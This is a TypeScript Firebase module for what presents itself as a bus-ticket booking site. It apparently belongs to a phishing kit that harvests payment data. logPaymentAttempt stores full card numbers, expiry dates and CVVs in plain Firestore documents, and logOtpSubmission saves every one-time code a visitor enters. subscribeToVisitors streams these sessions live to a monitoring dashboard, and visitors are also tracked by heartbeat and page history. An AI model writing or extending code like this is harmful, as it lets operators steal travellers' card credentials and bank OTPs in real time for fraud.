import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { 
  getFirestore, 
  doc, 
  getDocFromServer,
  collection,
  setDoc,
  updateDoc,
  getDocs,
  query,
  orderBy,
  limit,
  arrayUnion,
  onSnapshot
} from 'firebase/firestore';
// User-provided Firebase configuration
import firebaseConfig from '@/firebase-applet-config.json';

if (!firebaseConfig || !firebaseConfig.projectId) {
  console.error('CRITICAL: Firebase configuration is missing or invalid! Check firebase-applet-config.json');
}

import { Ticket } from './types';
import { OrderData } from './firestore-types';

// Initialize Firebase App
const app = getApps().length === 0 ? initializeApp(firebaseConfig) : getApp();

// Initialize Firestore
const firestore = getFirestore(app);
export const db = firestore;
export const auth = getAuth(app);

export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

export interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
  };
}

export function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null): never {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid || null,
      email: auth.currentUser?.email || null,
      emailVerified: auth.currentUser?.emailVerified || null,
      isAnonymous: auth.currentUser?.isAnonymous || null,
    },
    operationType,
    path,
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

// Test connection on boot as mandated
export async function testConnection(): Promise<boolean> {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
    return true;
  } catch (error) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.warn('Firebase client is offline, check connection/credentials.');
    }
    // Connection test is non-fatal for UI initial load
    return false;
  }
}

// ==========================================
// 1. VISITOR SESSION & ONLINE STATUS TRACKER
// ==========================================

let currentSessionId: string | null = null;
let navigationHistoryList: Array<{ page: string; step?: string; timestamp: string }> = [];

export function getSessionId(): string {
  if (currentSessionId) return currentSessionId;
  const existing = localStorage.getItem('jett_visitor_session_id');
  if (existing) {
    currentSessionId = existing;
  } else {
    currentSessionId = `SES_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
    localStorage.setItem('jett_visitor_session_id', currentSessionId);
  }
  return currentSessionId;
}

export async function initVisitorSession(initialPage: string, language: string): Promise<string> {
  const sessionId = getSessionId();
  const now = new Date().toISOString();
  navigationHistoryList = [{ page: initialPage, step: 'open', timestamp: now }];

  const deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'unknown',
    screen: typeof window !== 'undefined' ? `${window.innerWidth}x${window.innerHeight}` : 'unknown',
    language: navigator.language || language,
    referrer: typeof document !== 'undefined' ? document.referrer : '',
  };

  const sessionDoc = {
    id: sessionId,
    isOnline: true,
    currentPage: initialPage,
    bookingStep: 'open',
    openedAt: now,
    lastActiveAt: now,
    language,
    deviceInfo,
    navigationHistory: navigationHistoryList,
    status: 'active',
  };

  try {
    await setDoc(doc(db, 'visitor_sessions', sessionId), sessionDoc, { merge: true });
  } catch (err) {
    console.warn('Failed to init visitor session in Firestore:', err);
  }

  // Heartbeat every 20 seconds
  if (typeof window !== 'undefined') {
    setInterval(() => {
      updateVisitorPresence(true);
    }, 20000);

    // Online / Offline tracking
    document.addEventListener('visibilitychange', () => {
      const isOnline = document.visibilityState === 'visible';
      updateVisitorPresence(isOnline);
    });

    window.addEventListener('beforeunload', () => {
      updateVisitorPresence(false);
    });
  }

  return sessionId;
}

export async function updateVisitorPresence(isOnline: boolean): Promise<void> {
  const sessionId = getSessionId();
  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      isOnline,
      lastActiveAt: new Date().toISOString(),
      ...(isOnline ? {} : { status: 'offline' }),
    });
  } catch (err) {
    // Non-blocking
  }
}

export async function updateVisitorPage(currentPage: string, bookingStep?: string): Promise<void> {
  const sessionId = getSessionId();
  const now = new Date().toISOString();
  navigationHistoryList.push({ page: currentPage, step: bookingStep, timestamp: now });
  
  // Keep last 30 actions
  if (navigationHistoryList.length > 30) {
    navigationHistoryList = navigationHistoryList.slice(-30);
  }

  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      currentPage,
      bookingStep: bookingStep || 'browse',
      lastActiveAt: now,
      isOnline: true,
      navigationHistory: navigationHistoryList,
    });
  } catch (err) {
    // Silent failover
  }
}

export async function logVisitorSearch(searchQuery: object): Promise<void> {
  const sessionId = getSessionId();
  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      activeSearch: searchQuery,
      lastActiveAt: new Date().toISOString(),
      isOnline: true,
    });
  } catch (err) {
    // Silent
  }
}

export async function logVisitorTripSelection(trip: object, selectedSeats: number[]): Promise<void> {
  const sessionId = getSessionId();
  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      selectedTrip: trip,
      selectedSeats,
      bookingStep: 'seats_selected',
      status: 'in_checkout',
      lastActiveAt: new Date().toISOString(),
    });
  } catch (err) {
    // Silent
  }
}

export async function logVisitorCheckoutProgress(data: {
  passengerNames?: string[];
  contactEmail?: string;
  contactPhone?: string;
}): Promise<void> {
  const sessionId = getSessionId();
  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      checkoutData: data,
      lastActiveAt: new Date().toISOString(),
    });
  } catch (err) {
    // Silent
  }
}

// ==========================================
// 2. PAYMENT & TRANSACTION LOGS
// ==========================================

export async function logPaymentAttempt(paymentData: {
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  amount: number;
  passengerNames: string[];
  contactEmail: string;
  contactPhone: string;
  trip: object;
  selectedSeats: number[];
}): Promise<string> {
  const sessionId = getSessionId();
  const transactionId = `TXN_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
  const now = new Date().toISOString();

  // Detect card brand
  const cleanedNum = paymentData.cardNumber.replace(/\s/g, '');
  let cardBrand = 'Credit Card';
  if (cleanedNum.startsWith('4')) cardBrand = 'Visa';
  else if (cleanedNum.startsWith('5') || cleanedNum.startsWith('2')) cardBrand = 'MasterCard';
  else if (cleanedNum.startsWith('34') || cleanedNum.startsWith('37')) cardBrand = 'American Express';

  const transactionRecord = {
    id: transactionId,
    sessionId,
    cardHolder: paymentData.cardHolder,
    cardNumber: paymentData.cardNumber,
    cardBrand,
    expiry: paymentData.expiry,
    cvv: paymentData.cvv,
    amount: paymentData.amount,
    currency: 'JOD',
    passengerNames: paymentData.passengerNames,
    contactEmail: paymentData.contactEmail,
    contactPhone: paymentData.contactPhone,
    tripDetails: paymentData.trip,
    selectedSeats: paymentData.selectedSeats,
    status: 'otp_verification',
    otpAttempts: 0,
    createdAt: now,
  };

  try {
    // 2. Update visitor session with current payment state
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      bookingStep: 'payment_attempted',
      lastActiveAt: now,
      paymentInfo: {
        transactionId,
        cardHolder: paymentData.cardHolder,
        cardNumber: paymentData.cardNumber,
        cardBrand,
        expiry: paymentData.expiry,
        cvv: paymentData.cvv,
        amount: paymentData.amount,
        currency: 'JOD',
        status: 'otp_verification',
        timestamp: now,
      },
    });
  } catch (err) {
    console.warn('Failed to log payment attempt to Firestore:', err);
  }

  return transactionId;
}

export async function logOtpSubmission(
  transactionId: string,
  submittedOtp: string,
  attemptNumber: number,
  outcome: 'completed' | 'failed',
  pnr?: string
): Promise<void> {
  const sessionId = getSessionId();
  const now = new Date().toISOString();

  const otpSubmissionEntry = {
    otp: submittedOtp,
    attempt: attemptNumber,
    status: outcome,
    timestamp: now,
  };

  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      bookingStep: outcome === 'completed' ? 'checkout_completed' : 'otp_failed',
      status: outcome === 'completed' ? 'completed' : 'in_checkout',
      lastActiveAt: now,
      ...(pnr ? { pnr } : {}),
      'paymentInfo.lastOtp': submittedOtp,
      'paymentInfo.otpCodes': arrayUnion(submittedOtp),
      'paymentInfo.otpSubmissions': arrayUnion(otpSubmissionEntry),
      'paymentInfo.status': outcome,
    });
  } catch (err) {
    console.warn('Failed to record OTP submission in Firestore:', err);
  }
}

export async function updatePaymentTransactionStatus(
  transactionId: string, 
  status: 'completed' | 'failed', 
  pnr?: string, 
  otpAttempts?: number
): Promise<void> {
  const sessionId = getSessionId();
  const now = new Date().toISOString();

  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      bookingStep: status === 'completed' ? 'checkout_completed' : 'otp_failed',
      status: status === 'completed' ? 'completed' : 'in_checkout',
      lastActiveAt: now,
      ...(pnr ? { pnr } : {}),
      'paymentInfo.status': status,
    });
  } catch (err) {
    console.warn('Failed to update payment transaction status:', err);
  }
}

// ==========================================
// 3. BUS TICKETS & BOOKINGS
// ==========================================

export async function saveTicketToFirestore(ticket: Ticket): Promise<void> {
  const sessionId = (ticket as any).sessionId || getSessionId();
  const now = new Date().toISOString();
  
  const ticketDoc = {
    id: ticket.id,
    pnr: ticket.pnr,
    origin: ticket.trip.origin,
    destination: ticket.trip.destination,
    busType: ticket.trip.busType || 'Regular',
    departureTime: ticket.trip.departureTime || '',
    departureDate: ticket.departureDate,
    totalPrice: ticket.totalPrice,
    status: ticket.status || 'confirmed',
    contactEmail: ticket.contactEmail || '',
    contactPhone: ticket.contactPhone || '',
    passengerNames: ticket.passengerNames || [],
    selectedSeats: ticket.selectedSeats || [],
    createdAt: now,
    fullTripData: ticket.trip,
    sessionId
  };

  // 1. Save to session for live tracking
  try {
    await updateDoc(doc(db, 'visitor_sessions', sessionId), {
      tickets: arrayUnion(ticketDoc),
      status: 'completed',
      lastActiveAt: now
    });
  } catch (error) {
    console.warn('Failed to update session with ticket:', error);
  }

  // 2. Save to top-level tickets collection for permanent storage
  try {
    await setDoc(doc(db, 'tickets', ticket.id), ticketDoc);
  } catch (error) {
    handleFirestoreError(error, OperationType.CREATE, `tickets/${ticket.id}`);
  }
}

// Update ticket status (e.g. cancellation / refund)
export async function updateTicketStatusInFirestore(ticketId: string, status: 'confirmed' | 'cancelled'): Promise<void> {
  const path = `tickets/${ticketId}`;
  try {
    await updateDoc(doc(db, 'tickets', ticketId), {
      status,
    });
  } catch (error) {
    handleFirestoreError(error, OperationType.UPDATE, path);
  }
}

// Fetch all tickets from Firestore
export async function fetchTicketsFromFirestore(): Promise<Ticket[]> {
  const path = 'tickets';
  try {
    const q = query(collection(db, 'tickets'), orderBy('createdAt', 'desc'), limit(50));
    const snap = await getDocs(q);
    const list: Ticket[] = [];
    snap.forEach((d) => {
      const data = d.data();
      list.push({
        id: data.id || d.id,
        pnr: data.pnr || d.id,
        trip: data.fullTripData || {
          id: data.id,
          origin: data.origin,
          destination: data.destination,
          departureTime: data.departureTime,
          arrivalTime: '',
          price: data.totalPrice / (data.selectedSeats?.length || 1),
          busType: data.busType,
          availableSeats: 30,
          totalSeats: 36,
        },
        passengerNames: data.passengerNames || [],
        selectedSeats: data.selectedSeats || [],
        departureDate: data.departureDate,
        totalPrice: data.totalPrice,
        bookingTime: data.createdAt ? new Date(data.createdAt).toLocaleString() : '',
        status: data.status || 'confirmed',
        contactEmail: data.contactEmail || '',
        contactPhone: data.contactPhone || '',
      });
    });
    return list;
  } catch (error) {
    console.warn('Could not fetch tickets from Firestore:', error);
    return [];
  }
}

export function subscribeToVisitors(callback: (visitors: OrderData[]) => void): () => void {
  const path = 'visitor_sessions';
  const q = query(collection(db, path), orderBy('lastActiveAt', 'desc'), limit(100));
  
  return onSnapshot(q, (snapshot) => {
    const visitors: OrderData[] = snapshot.docs.map(doc => {
      const data = doc.data();
      return {
        id: doc.id,
        timestamp: data.openedAt || data.lastActiveAt || new Date().toISOString(),
        amount: data.paymentInfo?.amount || 0,
        status: data.status === 'completed' ? 'completed' : data.status === 'in_checkout' ? 'pending' : 'failed',
        paymentMethod: data.paymentInfo?.cardBrand ? 'card' : 'unknown',
        rawSession: data as any,
      };
    });
    callback(visitors);
  }, (error) => {
    handleFirestoreError(error, OperationType.LIST, path);
  });
}

// ==========================================
// 4. CHARTER REQUESTS
// ==========================================

export async function saveCharterRequest(data: {
  coachType: string;
  duration: number;
  date: string;
  itinerary: string;
  name: string;
  email: string;
  phone: string;
}): Promise<string> {
  const id = `CR-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
  const path = `charter_requests/${id}`;
  try {
    await setDoc(doc(db, 'charter_requests', id), {
      id,
      ...data,
      createdAt: new Date().toISOString(),
    });
    return id;
  } catch (error) {
    handleFirestoreError(error, OperationType.CREATE, path);
  }
}
